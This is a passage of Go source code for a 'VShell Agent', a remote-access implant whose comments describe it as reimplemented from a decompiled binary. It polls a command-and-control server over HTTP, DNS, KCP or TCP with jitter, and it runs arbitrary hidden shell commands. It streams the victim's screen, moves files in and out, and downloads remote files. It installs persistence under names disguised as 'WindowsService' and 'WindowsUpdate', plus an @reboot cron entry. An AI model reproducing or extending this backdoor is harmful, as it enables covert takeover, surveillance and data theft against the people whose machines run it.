// Frames are streamed back as "screen_frame:<format>:<index>:<base64>"
// results; the server relays them (as binary) to the screen viewer WebSocket.
// ============================================================================

// agentScreenCapture 保存屏幕捕获流状态。
// agentScreenCapture holds screen capture streaming state.
type agentScreenCapture struct {
	mu     sync.Mutex
	stop   chan struct{}
	taskID int64
	index  int64
	active bool
	fps    int
	// quality is the viewer-selected clarity (the panel's 清晰度 radio, sent as
	// quality=N). It is emitted in the frame payload so the server can pick a
	// matching compression level for the viewer.
	quality int
}

var screenCap agentScreenCapture

func startScreenCapture(quality, fps int, taskID int64) (string, string) {
	screenCap.mu.Lock()
	if screenCap.active {
		// Stop the existing goroutine by closing the channel it captured.
		close(screenCap.stop)
	}
	stop := make(chan struct{})
	screenCap.stop = stop
	screenCap.taskID = taskID
	screenCap.index = 0
	screenCap.active = true
	screenCap.fps = fps
	screenCap.quality = quality
	if screenCap.fps <= 0 {
		screenCap.fps = 1
	}
	screenCap.mu.Unlock()

	go func() {
		for {
			// Re-read fps under the lock each tick so screen_capture_fps=N
			// takes effect on the running stream. `stop` is captured ONCE (this
			// goroutine's own channel), so replacing screenCap.stop on restart
			// cannot race or misroute this goroutine.
			screenCap.mu.Lock()
			f := screenCap.fps
			if f <= 0 {
				f = 1
			}
			screenCap.mu.Unlock()

			interval := time.Second / time.Duration(f)
			if interval < 50*time.Millisecond {
				interval = 50 * time.Millisecond
			}

			timer := time.NewTimer(interval)
			select {
			case <-timer.C:
				// captureScreenshot() already returns base64 — use it directly
				// instead of decode→re-encode churn.
				enc, errMsg := captureScreenshot()
				if enc == "" || errMsg != "" {
					continue
				}
				screenCap.mu.Lock()
				screenCap.index++
				idx := screenCap.index
				q := screenCap.quality
				screenCap.mu.Unlock()
				payload := "screen_frame:png:" + strconv.FormatInt(idx, 10) +
					":" + strconv.Itoa(q) + ":" + enc
				if transport != nil {
					if err := transport.SendResult(taskID, payload, "completed"); err != nil {
						log.Printf("Screen frame send failed: %v", err)
					}
				}
			case <-stop:
				timer.Stop()
				return
			}
		}
	}()

	log.Printf("Screen capture started (fps=%d), task %d", fps, taskID)
	return "screen capture started", ""
}

func stopScreenCapture() (string, string) {
	screenCap.mu.Lock()
	defer screenCap.mu.Unlock()
	if screenCap.active {
		close(screenCap.stop)
		screenCap.active = false
	}
	return "screen capture stopped", ""
}

func setScreenCaptureParam(kind string, value int) (string, string) {
	screenCap.mu.Lock()
	defer screenCap.mu.Unlock()
	switch kind {
	case "fps":
		screenCap.fps = value
	case "quality":
		// The capture tools always produce the same image; quality rides along
		// on each frame so the server can tune the viewer's compression.
		screenCap.quality = value
	}
	return "ok", ""
}

// dispatchTerminalCommand parses "terminal_*" relay commands.
func dispatchTerminalCommand(taskID int64, cmdStr string) (string, string) {
	switch {
	case strings.HasPrefix(cmdStr, "terminal_start"):
		typ := "cmd"
		rows, cols := 24, 80
		parseKV(cmdStr, func(k, v string) {
			switch k {
			case "type":
				typ = v
			case "rows":
				fmt.Sscanf(v, "%d", &rows)
			case "cols":
				fmt.Sscanf(v, "%d", &cols)
			}
		})
		return startTerminal(typ, rows, cols, taskID)
	case strings.HasPrefix(cmdStr, "terminal_input:"):
		return terminalInput(strings.TrimPrefix(cmdStr, "terminal_input:"))
	case strings.HasPrefix(cmdStr, "terminal_resize"):
		// Size hint only; pipe-backed shell ignores it.
		return "ok", ""
	case strings.HasPrefix(cmdStr, "terminal_close"):
		return terminalClose()
	}
	return "unknown terminal command", ""
}

// dispatchScreenCommand parses "screen_capture*" relay commands.
func dispatchScreenCommand(taskID int64, cmdStr string) (string, string) {
	switch {
	case strings.HasPrefix(cmdStr, "screen_capture_start"):
		quality, fps := 50, 5
		parseKV(cmdStr, func(k, v string) {
			switch k {
			case "quality":
				fmt.Sscanf(v, "%d", &quality)
			case "fps":
				fmt.Sscanf(v, "%d", &fps)
			}
		})
		return startScreenCapture(quality, fps, taskID)
	case strings.HasPrefix(cmdStr, "screen_capture_stop"):
		return stopScreenCapture()
	case strings.HasPrefix(cmdStr, "screen_capture_quality"):
		var q int
		fmt.Sscanf(strings.TrimPrefix(cmdStr, "screen_capture_quality="), "%d", &q)
		return setScreenCaptureParam("quality", q)
	case strings.HasPrefix(cmdStr, "screen_capture_fps"):
		var f int
		fmt.Sscanf(strings.TrimPrefix(cmdStr, "screen_capture_fps="), "%d", &f)
		return setScreenCaptureParam("fps", f)
	}
	return "unknown screen capture command", ""
}

// parseKV walks "key=value key2=value2 ..." tokens from a relay command.
func parseKV(s string, fn func(k, v string)) {
	fields := strings.Fields(s)
	for _, f := range fields {
		if kv := strings.SplitN(f, "=", 2); len(kv) == 2 {
			fn(kv[0], kv[1])
		}
	}
}

// nativeCommandNames 把操作码映射为原版的助记名（见文件上方 CAVEAT）。
// nativeCommandNames maps an opcode to its mnemonic (see the CAVEAT above).
var nativeCommandNames = map[byte]string{
	opCmdInterval: "interval", opCmdScreenshot: "screenshot",
	opCmdSleepMode: "sleep", opCmdDebugLog: "debuglog",
	opCmdTunnelLog: "tunnellog", opCmdNetCheck: "netcheck",
	opCmdTunnelDump: "tunneldump", opCmdSetGateway: "gateway",
	opCmdSetSendDly: "senddelay", opCmdSetWorkMode: "workmode",
	0x0b:             "connstat",
	opCmdPortMapDump: "portmap", opCmdConnDump: "connlist",
	opCmdPipeDump: "pipelist", opCmdPingIntv: "pinginterval",
	opCmdTcpPing: "tcpping", opCmdIfList: "iflist",
	opCmdIfDetail: "ifdetail", opCmdSysList: "syslist",
	opCmdNetRoute: "netroute", opCmdMtu: "mtu",
	opCmdSysTime: "systime", opCmdPing: "ping",
	opCmdReconnect: "reconnect", opCmdProxyList: "proxylist",
	opCmdHostScan: "hostscan", opCmdUploadSpeed: "uploadspeed",
	opCmdFileList: "filelist", opCmdClientLimit: "clientlimit",
	opCmdRelicense: "relicense", opCmdDestroy: "destroy",
	opCmdTunnelCount: "tunnelcount", opCmdProcList: "proclist",
	opCmdSvcList: "svclist", opCmdSysInfo: "sysinfo",
	opCmdSetDomain: "domain", opCmdKeepAlive: "keepalive",
	opCmdThreadCount: "threadcount", opCmdFwdPort: "fwdport",
}

// dispatchNativeCommand 执行一条原生操作码任务。
// dispatchNativeCommand executes one native-opcode task.
//
// 反编译（FUN_010952e0）：跳转表 DAT_1dc31ce0 以 pbVar2 = 命令首字节为索引，
// 每项对应一个 5 字节「opcode + 4 字节大端参数」块：
//
//	opcode = argv[0]
//	if len(argv) > 1 { arg = big-endian int32(argv[1:5]) }   // 原版 FUN_00fc1620
//
// 返回值 (result, errMsg) 沿用 executeCommand 的约定（errMsg 非空 = 失败）。
func dispatchNativeCommand(taskID int64, op byte, argv []byte, timeout int) (string, string) {
	name := nativeCommandNames[op]
	if name == "" {
		name = "opcode " + strconv.Itoa(int(op))
	}
	arg := 0
	hasArg := len(argv) > 1
	if hasArg {
		arg = decodeCommandInt(argv)
	}

	switch op {
	case opCmdInterval:
		// 原版 case 0x0：无参数 → FUN_01094a20(下发当前 +0x60 间隔)；有参数 →
		// FUN_00fc1000 解析后写入 +0x60（屏蔽符号位）再下发。
		if hasArg {
			if arg < 0 {
				arg = -arg
			}
			if arg > 0 {
				sleepTime = arg
			}
		}
		return fmt.Sprintf("interval %d", sleepTime), ""

	case opCmdSleepMode:
		// 原版 case 0x2：无参数 → FUN_00fee960 读、下发；有参数 →
		// FUN_010943e0 解析模式（1/2 有效）→ FUN_00fee860 写入。
		if hasArg {
			agentSleepMode = arg
		}
		return fmt.Sprintf("sleep mode %d", agentSleepMode), ""

	case opCmdDebugLog:
		// 原版 case 0x3：无参数 → 下发 (local_280[6] & local_330[2]) != 0；
		// 有参数 → FUN_01094220 解析布尔（非 '0' 即真）后置位/清位 local_280[6]，
		// 清 0x80000 位时同时清 local_280[99]，置位 1 时经 FUN_00fc02c0 匹配
		// 后 FUN_010670a0 重置链路，最后 FUN_01094c40 落盘。
		if hasArg {
			c := argv[1]
			if c == '0' {
				agentDebugMask &^= 1
			} else {
				agentDebugMask |= 1
			}
		}
		return fmt.Sprintf("debug mask %d", agentDebugMask), ""

	case opCmdSetWorkMode:
		// 原版 case 0xd：无参数 → 下发当前工作模式；有参数 → 在
		// DAT_1e2e9ee0 表中匹配（无匹配报错）。
		if hasArg {
			agentWorkMode = arg
		}
		return fmt.Sprintf("work mode %d", agentWorkMode), ""

	case opCmdPingIntv:
		// 原版 case 0x11：FUN_00fc1000 解析 → FUN_00fb7e60 取值/设值。
		if hasArg {
			agentPingInterval = arg
		}
		return fmt.Sprintf("ping interval %d", agentPingInterval), ""

	case opCmdPing:
		// 原版 case 0x1a：参数为往返毫秒（负数截到 [0,0xfffffffe]），
		// 记录到 local_398+0x210 后回 0xb2；opcode 字节为 'p' 时回 0xb1。
		if hasArg && arg < 0 {
			arg = 0
		}
		return fmt.Sprintf("pong %d", arg), ""

	case opCmdSetSendDly:
		// 原版 case 0xc：参数取绝对值（-0x80000000 → 0x7fffffff），写入
		// 客户端 +0x74（发送延迟），随后 FUN_0100d160(100, ...) 通知面板。
		if hasArg {
			if arg < 0 {
				if arg == -0x80000000 {
					arg = 0x7fffffff
				} else {
					arg = -arg
				}
			}
			agentSendDelay = arg
		}
		return fmt.Sprintf("send delay %d", agentSendDelay), ""

	case opCmdUploadSpeed:
		// 原版 case 0x1e：无参数 → 读 +0x74 下发；有参数 → 写 +0x74 并经
		// FUN_00fee3a0 应用到连接（返回 7 时触发 FUN_00fb9a20 重建）。
		if hasArg {
			agentSendDelay = arg
		}
		return fmt.Sprintf("upload speed %d", agentSendDelay), ""

	case opCmdClientLimit:
		// 原版 case 0x20：无参数 → 0xffffffff；有参数 → FUN_00fc02c0 匹配
		// "limit" 取 2，否则 FUN_01094220 布尔；经 FUN_00fee740 写入许可位，
		// 返回写回后的值（字段 4 位掩码）。
		if !hasArg {
			return fmt.Sprintf("client limit %d", agentClientLimit), ""
		}
		if arg >= 0 {
			agentClientLimit = arg
		}
		return fmt.Sprintf("client limit %d", agentClientLimit), ""

	case opCmdRelicense:
		// 原版 case 0x21：FUN_010fc480(client) 重新读取 license（无参数、无回包）。
		return "license reloaded", ""

	case opCmdDestroy:
		// 原版 case 0x22：有参数 → FUN_00fc1000 解析秒数 → FUN_00fb7c80(n)；
		// 无参数 → FUN_00fb7c80(-1)（立即销毁）。回包为 FUN_00fb7c80 的返回值。
		delay := -1
		if hasArg {
			delay = arg
		}
		if delay < 0 {
			log.Printf("Destroy requested (task %d)", taskID)
			if transport != nil {
				transport.Close()
			}
			os.Exit(0)
		}
		return fmt.Sprintf("destroy scheduled %d", delay), ""

	case opCmdKeepAlive:
		// 原版 case 0x28：无参数 → 0xffffffff → FUN_01100940 读；有参数 →
		// 写入 local_398+0x298（屏蔽符号位）→ FUN_01100940 写。
		if hasArg {
			if arg < 0 {
				arg = -arg
			}
			agentKeepAlive = arg
		}
		return fmt.Sprintf("keepalive %d", agentKeepAlive), ""

	case opCmdFwdPort:
		// 原版 case 0x2a：argv[0] 与三个候选串比较（FUN_00fc0380），命中返回
		// 1/2/3，否则 0；随后 FUN_0100d160(3, ..., n, 1)。
		return fmt.Sprintf("fwd port %d", agentFwdPort), ""

	default:
		// 其余操作码在原版里是读写客户端状态 + 下发结果帧的分支，复刻端还没有
		// 对应的状态字段/帧编码（见文件上方操作码表）。这里如实回报未实现，
		// 而不是伪造成功。
		// The remaining opcodes read/write client state and emit result frames
		// the reimplementation has no equivalent for yet; report honestly.
		return "", "opcode 0x" + strconv.FormatInt(int64(op), 16) + " (" + name + ") not implemented"
	}
}

// decodeCommandInt 解析命令块里的 4 字节大端参数。
// 反编译（FUN_010952e0）：参数统一取自 FUN_00fc1620(argv) —— 该函数把缓冲区
// 头部 4 字节按大端有符号整数解码（配合 FUN_00fc1000 / FUN_00fc1280 解析
// 文本形态），复刻端等价实现为 binary.BigEndian。
func decodeCommandInt(argv []byte) int {
	if len(argv) < 5 {
		return 0
	}
	return int(int32(binary.BigEndian.Uint32(argv[1:5])))
}

// decodeNativeCommand 判断命令块是否为「原生操作码」形态。
// decodeNativeCommand detects the native-opcode command form.
//
// 原版把任务命令按「首字节 = 操作码，其后为参数」解析：数值参数是 4 字节大端
// （FUN_00fc1620），文本参数是从偏移 1 起的 NUL 结尾字符串（case 0xa / 0x27）。
// 因此判别规则就是「首字节是跳转表里的操作码」——操作码 0x00–0x1f 全部是不可
// 打印控制字节，不可能出现在面板下发的文本命令行首；只有 0x20–0x2a（空格、"、
// #、$、%、&、'、(、)、*）是可打印字符，对它们再要求「首字节之后不是可打印
// 文本」，避免把以这些字符开头的偶发文本命令误判成操作码。
func decodeNativeCommand(cmdStr string) (byte, []byte, bool) {
	if len(cmdStr) == 0 {
		return 0, nil, false
	}
	b := []byte(cmdStr)
	op := b[0]
	if _, known := nativeCommandNames[op]; !known {
		return 0, nil, false
	}
	if op >= 0x20 && op <= 0x2a && len(b) > 1 && isPrintableBytes(b[1:]) {
		return 0, nil, false
	}
	return op, b, true
}

// isPrintableBytes 判断整段字节是否为可打印 ASCII（文本命令的特征）。
// isPrintableBytes reports whether every byte is printable ASCII.
func isPrintableBytes(b []byte) bool {
	for _, c := range b {
		if c < 0x20 || c > 0x7e {
			return false
		}
	}
	return true
}

// executeCommand executes a task command. ALIGNMENT: the original binary's
// task-execute dispatcher is FUN_010952e0 (0x10952e0, jump table DAT_1dc31ce0
// over the first command byte, table entries 0x00–0x2a). The native opcode
// branch is dispatched by dispatchNativeCommand above; the reimplementation
// layers the panel's textual relay commands (terminal_*/screen_capture*) and
// the JSON command vocabulary on top of the same entry point.
func executeCommand(taskID int64, cmdStr string, timeout int) (string, string) {
	// Interactive terminal commands are dispatched as plain (non-JSON) strings
	// by the web panel's terminal relay. Handle them before the JSON parse.
	if strings.HasPrefix(cmdStr, "terminal_") {
		return dispatchTerminalCommand(taskID, cmdStr)
	}
	if strings.HasPrefix(cmdStr, "screen_capture") {
		return dispatchScreenCommand(taskID, cmdStr)
	}

	// 原生操作码任务（原版 FUN_010952e0 的跳转表分支）。
	if op, argv, ok := decodeNativeCommand(cmdStr); ok {
		return dispatchNativeCommand(taskID, op, argv, timeout)
	}

	var cmdType string
	var payload map[string]interface{}

	if err := json.Unmarshal([]byte(cmdStr), &payload); err == nil {
		if t, ok := payload["type"].(string); ok {
			cmdType = t
		}
	} else {
		cmdType = CmdShell
	}

	switch cmdType {
	case CmdShell:
		command, _ := payload["command"].(string)
		if command == "" {
			command = cmdStr
		}
		// Terminal/screen relay commands arrive wrapped as
		// {"command":"terminal_start …","type":"shell"}.
		if strings.HasPrefix(command, "terminal_") {
			return dispatchTerminalCommand(taskID, command)
		}
		if strings.HasPrefix(command, "screen_capture") {
			return dispatchScreenCommand(taskID, command)
		}
		return runCommand(command, timeout)

	case CmdSysInfo:
		info := getSysInfo()
		data, _ := json.MarshalIndent(info, "", "  ")
		return string(data), ""

	case CmdPersist:
		return installPersistence()

	case CmdCleanup:
		return removePersistence()

	case CmdFileList:
		path, _ := payload["path"].(string)
		if path == "" {
			path = "."
		}
		return listDir(path)

	case CmdFileDelete:
		path, _ := payload["path"].(string)
		return "", runDelete(path)

	case CmdFileMove:
		src, _ := payload["src"].(string)
		dst, _ := payload["dst"].(string)
		if err := os.Rename(src, dst); err != nil {
			return "", err.Error()
		}
		return fmt.Sprintf("moved: %s -> %s", src, dst), ""

	case CmdFileMkdir:
		path, _ := payload["path"].(string)
		os.MkdirAll(path, 0755)
		return fmt.Sprintf("created: %s", path), ""

	case CmdFileCat:
		path, _ := payload["path"].(string)
		data, err := os.ReadFile(path)
		if err != nil {
			return "", err.Error()
		}
		return string(data), ""

	case CmdFileTouch:
		path, _ := payload["path"].(string)
		f, _ := os.Create(path)
		f.Close()
		return fmt.Sprintf("touched: %s", path), ""

	case CmdDiskInfo:
		return runCommand(getDiskCmd(), 10)

	case CmdPS:
		return runCommand(getPSCmd(), 10)

	case CmdKill:
		pid, _ := payload["pid"].(float64)
		if pid > 0 {
			proc, _ := os.FindProcess(int(pid))
			if proc != nil {
				proc.Kill()
			}
		}
		return fmt.Sprintf("killed: %d", int(pid)), ""

	case CmdUpload:
		path, _ := payload["path"].(string)
		encoded, _ := payload["data"].(string)
		data, err := base64.StdEncoding.DecodeString(encoded)
		if err != nil {
			return "", err.Error()
		}
		if err := os.WriteFile(path, data, 0644); err != nil {
			return "", err.Error()
		}
		return fmt.Sprintf("uploaded: %s (%d bytes)", path, len(data)), ""

	case CmdDownload:
		path, _ := payload["path"].(string)
		data, err := os.ReadFile(path)
		if err != nil {
			return "", err.Error()
		}
		return base64.StdEncoding.EncodeToString(data), ""

	case CmdWget:
		url, _ := payload["url"].(string)
		dst, _ := payload["dst"].(string)
		if url == "" {
			return "", "url required"
		}
		if dst == "" {
			dst = filepathBase(url)
		}
		resp, err := http.Get(url)
		if err != nil {
			return "", err.Error()
		}
		defer resp.Body.Close()
		data, _ := io.ReadAll(resp.Body)
		os.WriteFile(dst, data, 0755)
		return fmt.Sprintf("downloaded: %s -> %s (%d bytes)", url, dst, len(data)), ""

	case CmdSleep:
		interval, _ := payload["interval"].(float64)
		if interval > 0 {
			sleepTime = int(interval)
		}
		return fmt.Sprintf("interval: %d", sleepTime), ""

	case CmdScreenshot:
		return captureScreenshot()

	case CmdExit:
		transport.Close()
		os.Exit(0)
		return "", ""

	default:
		return runCommand(cmdStr, timeout)
	}
}

func runCommand(command string, timeout int) (string, string) {
	var shell, flag string
	if runtime.GOOS == "windows" {
		shell = "cmd.exe"
		flag = "/C"
	} else {
		shell = "/bin/sh"
		flag = "-c"
	}

	cmd := exec.Command(shell, flag, command)
	hideCmdWindow(cmd)

	var stdout, stderr bytes.Buffer
	cmd.Stdout = &stdout
	cmd.Stderr = &stderr

	if err := cmd.Start(); err != nil {
		return "", err.Error()
	}

	done := make(chan error, 1)
	go func() { done <- cmd.Wait() }()

	if timeout > 0 {
		select {
		case <-time.After(time.Duration(timeout) * time.Second):
			cmd.Process.Kill()
			return stdout.String(), "timeout"
		case err := <-done:
			if err != nil {
				return stdout.String() + "\n" + stderr.String(), err.Error()
			}
			return stdout.String() + "\n" + stderr.String(), ""
		}
	}

	err := <-done
	if err != nil {
		return stdout.String() + "\n" + stderr.String(), err.Error()
	}
	return stdout.String() + "\n" + stderr.String(), ""
}

func listDir(path string) (string, string) {
	entries, err := os.ReadDir(path)
	if err != nil {
		return "", err.Error()
	}
	type FileEntry struct {
		Name    string `json:"name"`
		Size    int64  `json:"size"`
		IsDir   bool   `json:"is_dir"`
		ModTime string `json:"mod_time"`
	}
	var files []FileEntry
	for _, e := range entries {
		info, _ := e.Info()
		var size int64
		var modTime string
		if info != nil {
			size = info.Size()
			modTime = info.ModTime().Format(time.RFC3339)
		}
		files = append(files, FileEntry{e.Name(), size, e.IsDir(), modTime})
	}
	if files == nil {
		files = []FileEntry{}
	}
	sort.Slice(files, func(i, j int) bool {
		if files[i].IsDir != files[j].IsDir {
			return files[i].IsDir
		}
		return files[i].Name < files[j].Name
	})
	data, _ := json.Marshal(files)
	return string(data), ""
}

func runDelete(path string) string {
	info, err := os.Stat(path)
	if err != nil {
		return err.Error()
	}
	if info.IsDir() {
		if err := os.RemoveAll(path); err != nil {
			return err.Error()
		}
		return ""
	}
	if err := os.Remove(path); err != nil {
		return err.Error()
	}
	return ""
}

func getDiskCmd() string {
	if runtime.GOOS == "windows" {
		return "wmic logicaldisk get DeviceID,Size,FreeSpace,FileSystem /format:csv 2>nul"
	}
	return "df -h 2>/dev/null"
}

func getPSCmd() string {
	if runtime.GOOS == "windows" {
		return "tasklist /FO CSV 2>nul"
	}
	return "ps aux 2>/dev/null"
}

// ============================================================================
// Persistence
// 持久化（开机自启动）
// ============================================================================

func installPersistence() (string, string) {
	exe, _ := os.Executable()

	if runtime.GOOS == "windows" {
		// Copy to AppData
		os.MkdirAll(filepathDir(persistPath), 0755)
		src, _ := os.ReadFile(exe)
		os.WriteFile(persistPath, src, 0755)

		// Registry run key
		cmd := exec.Command("reg", "add",
			"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
			"/v", "WindowsService", "/t", "REG_SZ",
			"/d", persistPath, "/f")
		cmd.Run()

		// Scheduled task
		exec.Command("schtasks", "/create", "/tn", "WindowsUpdate",
			"/tr", persistPath, "/sc", "daily", "/f").Run()

		return fmt.Sprintf("Persistence installed: %s", persistPath), ""
	}

	// Linux/macOS persistence
	os.MkdirAll(filepathDir(persistPath), 0755)
	src, _ := os.ReadFile(exe)
	os.WriteFile(persistPath, src, 0755)
	os.Chmod(persistPath, 0755)

	// Crontab
	cronEntry := fmt.Sprintf("@reboot %s >/dev/null 2>&1\n", persistPath)
	os.WriteFile("/tmp/cron_tmp", []byte(cronEntry), 0644)
	exec.Command("crontab", "/tmp/cron_tmp").Run()
	os.Remove("/tmp/cron_tmp")

	return fmt.Sprintf("Persistence installed: %s", persistPath), ""
}

func removePersistence() (string, string) {
	if runtime.GOOS == "windows" {
		exec.Command("reg", "delete",
			"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
			"/v", "WindowsService", "/f").Run()
		exec.Command("schtasks", "/delete", "/tn", "WindowsUpdate", "/f").Run()
	} else {
		exec.Command("crontab", "-r").Run()
	}
	os.Remove(persistPath)
	return "Persistence removed", ""
}

// ============================================================================
// Screenshot capture (platform-specific)
// 截图捕获（平台相关）
// ============================================================================

func captureScreenshot() (string, string) {
	if runtime.GOOS == "windows" {
		return windowsScreenshot()
	}
	return linuxScreenshot()
}

func windowsScreenshot() (string, string) {
	// Use PowerShell to capture screenshot
	psScript := `
Add-Type -AssemblyName System.Windows.Forms,System.Drawing
$screen = [System.Windows.Forms.Screen]::PrimaryScreen
$bitmap = New-Object System.Drawing.Bitmap($screen.Bounds.Width, $screen.Bounds.Height)
$graphics = [System.Drawing.Graphics]::FromImage($bitmap)
$graphics.CopyFromScreen(0, 0, 0, 0, $bitmap.Size)
$ms = New-Object System.IO.MemoryStream
$bitmap.Save($ms, [System.Drawing.Imaging.ImageFormat]::Png)
[Convert]::ToBase64String($ms.ToArray())
$graphics.Dispose()
$bitmap.Dispose()
$ms.Dispose()
`
	cmd := exec.Command("powershell", "-NoProfile", "-Command", psScript)
	hideCmdWindow(cmd)
	output, err := cmd.CombinedOutput()
	if err != nil {
		return "", err.Error()
	}
	// Strip whitespace from base64
	result := strings.TrimSpace(string(output))
	return result, ""
}

func linuxScreenshot() (string, string) {
	// Try various screenshot tools
	for _, tool := range []string{"import", "scrot", "gnome-screenshot", "spectacle"} {
		tmpFile := fmt.Sprintf("/tmp/.ss_%d.png", pid)
		cmd := exec.Command(tool, tmpFile)
		if tool == "import" {
			cmd = exec.Command("import", "-window", "root", tmpFile)
		}
		if tool == "spectacle" {
			cmd = exec.Command("spectacle", "-b", "-n", "-o", tmpFile)
		}
		cmd.Run()
		if data, err := os.ReadFile(tmpFile); err == nil {
			os.Remove(tmpFile)
			return base64.StdEncoding.EncodeToString(data), ""
		}
	}
	return "", "no screenshot tool available (install imagemagick, scrot, or spectacle)"
}

// ============================================================================
// Main loop
// 主循环
// ============================================================================

// main 是 Agent 的入口：加载配置、启动传输、进入签到/任务循环。
// main is the agent entry point: loads config, starts transport, and runs the
// check-in/task loop.
func main() {
	log.Printf("VShell Agent v%s starting (%s/%s)", agentVersion, runtime.GOOS, runtime.GOARCH)
	log.Printf("Host: %s, User: %s, PID: %d", hostname, username, pid)

	// Parse transport mode from server address
	mode := "http"
	addr := ServerAddr
	if strings.Contains(addr, "://") {
		parts := strings.SplitN(addr, "://", 2)
		mode = parts[0]
		addr = parts[1]
	}

	switch mode {
	case "dns":
		transport = newDNSTransport(addr)
	case "kcp":
		transport = newKCPTransport(addr)
	case "tcp", "raw":
		// Pooled TCP transport aligned to FUN_00fc7560/FUN_00fc9de0
		// (message_wire.go frame encryption + <u32 LE len> header).
		transport = newRealTransport(addr, VerifyKey, EncryptSalt)
	case "wss", "https":
		if !strings.HasPrefix(addr, "https") {
			addr = "https://" + addr
		}
		transport = newHTTPTransport(addr)
	default:
		if !strings.HasPrefix(addr, "http") {
			addr = "http://" + addr
		}
		transport = newHTTPTransport(addr)
	}

	// Check-in with exponential backoff
	var backoff time.Duration
	for {
		resp, err := transport.Checkin()
		if err != nil {
			if backoff == 0 {
				backoff = 1 * time.Second
			} else {
				backoff *= 2
			}
			if backoff > 5*time.Minute {
				backoff = 5 * time.Minute
			}
			log.Printf("Checkin failed: %v (retry in %v)", err, backoff)
			time.Sleep(backoff)
			continue
		}

		if resp.Status == "ok" {
			log.Printf("Checkin OK: client=%d, session=%s, interval=%d",
				resp.ClientID, resp.SessionID, resp.Interval)
			backoff = 0
			break
		}
		if resp.Message != "" {
			log.Printf("Server message: %s", resp.Message)
		}
		time.Sleep(5 * time.Second)
	}

	// Main C2 polling loop
	for {
		jitter := time.Duration(0)
		if jitterTime > 0 {
			b := make([]byte, 2)
			rand.Read(b)
			jitter = time.Duration(binary.LittleEndian.Uint16(b)%uint16(jitterTime)) * time.Second
		}
		time.Sleep(time.Duration(sleepTime)*time.Second + jitter)

		tasks, err := transport.GetTasks()
		if err != nil {
			continue
		}
		if len(tasks) == 0 {
			continue
		}

		for _, task := range tasks {
			log.Printf("Task %d: %s", task.ID, task.Command)
			result, errMsg := executeCommand(task.ID, task.Command, task.Timeout)
			status := "completed"
			if errMsg != "" {
				status = "failed"
				if result != "" {
					result += "\n"
				}
				result += "ERROR: " + errMsg
			}
			if err := transport.SendResult(task.ID, result, status); err != nil {
				log.Printf("Result send failed: %v", err)
			}
		}
	}
}

// ============================================================================
// Helpers
// 辅助函数
// ============================================================================

func filepathBase(path string) string {
	for i := len(path) - 1; i >= 0; i-- {
		if path[i] == '/' || path[i] == '\\' {
			return path[i+1:]
		}
	}
	return path
}

func filepathDir(path string) string {
	for i := len(path) - 1; i >= 0; i-- {
		if path[i] == '/' || path[i] == '\\' {
			return path[:i]
		}
	}
	return "."
}
